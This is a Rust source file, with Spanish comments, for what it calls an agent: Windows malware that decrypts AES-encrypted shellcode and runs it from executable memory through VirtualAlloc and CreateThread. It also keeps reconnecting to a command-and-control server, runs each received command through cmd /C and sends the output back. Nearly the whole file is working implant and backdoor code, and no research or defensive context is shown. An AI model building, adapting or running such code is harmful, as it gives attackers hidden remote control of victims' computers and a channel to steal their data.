#![windows_subsystem = "console"]  // Para debug

mod config;

use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}, Decryptor};
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::DWORD;
use std::net::TcpStream;
use std::io::{Read, Write, BufReader, BufRead};
use std::process::Command;
use std::thread;
use std::time::Duration;

type Aes256CbcDec = Decryptor<Aes256>;

const DELIMITER: &str = "\n<<END>>\n";  // Delimitador de mensajes

fn decrypt_shellcode() -> Vec<u8> {
    println!("DEBUG: Desencriptando shellcode");
    let cipher = Aes256CbcDec::new_from_slices(config::KEY, config::IV).unwrap();
    let mut buffer = config::ENCRYPTED_SHELLCODE.to_vec();
    let result = cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec();
    println!("DEBUG: Shellcode desencriptado: {} bytes", result.len());
    result
}

fn execute_shellcode() {
    println!("DEBUG: Ejecutando shellcode");
    unsafe {
        let shellcode = decrypt_shellcode();

        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            println!("DEBUG: Error allocando memoria");
            return;
        }

        copy(shellcode.as_ptr(), mem.cast::<u8>(), shellcode.len());

        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if !thread.is_null() {
            WaitForSingleObject(thread, INFINITE);
        }
    }
}

fn execute_command(cmd: &str) -> String {
    println!("DEBUG: Ejecutando comando: '{}'", cmd);
    
    // Comandos especiales
    if cmd == "ping" {
        return "pong".to_string();
    }
    
    if cmd == "exit" {
        std::process::exit(0);
    }
    
    let output = Command::new("cmd")
        .args(&["/C", cmd])
        .output();
    
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            let result = if !stdout.is_empty() {
                stdout.to_string()
            } else if !stderr.is_empty() {
                format!("[ERROR]\n{}", stderr)
            } else {
                "[OK] Comando ejecutado sin salida".to_string()
            };
            
            println!("DEBUG: Resultado: {} bytes", result.len());
            result
        }
        Err(e) => {
            let error = format!("[ERROR] No se pudo ejecutar: {}", e);
            println!("DEBUG: {}", error);
            error
        }
    }
}

fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    println!("DEBUG: Conexión establecida");
    
    // Configurar timeouts
    stream.set_read_timeout(Some(Duration::from_secs(60)))?;
    stream.set_write_timeout(Some(Duration::from_secs(10)))?;
    stream.set_nodelay(true)?;  // Deshabilitar Nagle para latencia baja
    
    let mut reader = BufReader::new(stream.try_clone()?);
    let mut writer = stream;
    
    loop {
        let mut command = String::new();
        
        println!("DEBUG: Esperando comando...");
        
        // Leer hasta encontrar el delimitador
        match reader.read_line(&mut command) {
            Ok(0) => {
                println!("DEBUG: Conexión cerrada por el servidor");
                return Err("Conexión cerrada".into());
            }
            Ok(n) => {
                println!("DEBUG: Recibidos {} bytes", n);
                let command = command.trim().to_string();
                
                if command.is_empty() {
                    continue;
                }
                
                println!("DEBUG: Comando: '{}'", command);
                
                // Ejecutar comando
                let result = execute_command(&command);
                
                // Enviar respuesta con delimitador
                let response = format!("{}{}", result, DELIMITER);
                println!("DEBUG: Enviando {} bytes de respuesta", response.len());
                
                match writer.write_all(response.as_bytes()) {
                    Ok(_) => {
                        writer.flush()?;
                        println!("DEBUG: Respuesta enviada exitosamente");
                    }
                    Err(e) => {
                        println!("DEBUG: Error enviando respuesta: {}", e);
                        return Err(e.into());
                    }
                }
            }
            Err(e) => {
                println!("DEBUG: Error leyendo comando: {}", e);
                return Err(e.into());
            }
        }
    }
}

fn connect_to_c2() {
    println!("DEBUG: Servidor C2: {}", config::C2_SERVER);
    
    loop {
        println!("DEBUG: Intentando conectar...");
        
        match TcpStream::connect(&config::C2_SERVER) {
            Ok(stream) => {
                println!("DEBUG: ✅ Conectado al C2");
                
                if let Err(e) = handle_connection(stream) {
                    println!("DEBUG: ❌ Error en conexión: {}", e);
                }
            }
            Err(e) => {
                println!("DEBUG: ❌ Error conectando: {}", e);
            }
        }
        
        println!("DEBUG: Reintentando en 5 segundos...");
        thread::sleep(Duration::from_secs(5));
    }
}

fn main() {
    println!("DEBUG: 🚀 Agente iniciado");
    println!("DEBUG: Servidor: {}", config::C2_SERVER);
    
    // Shellcode en hilo separado
    thread::spawn(|| {
        execute_shellcode();
    });
    
    // Esperar un poco antes de conectar
    thread::sleep(Duration::from_secs(2));
    
    // Conectar al C2
    connect_to_c2();
}
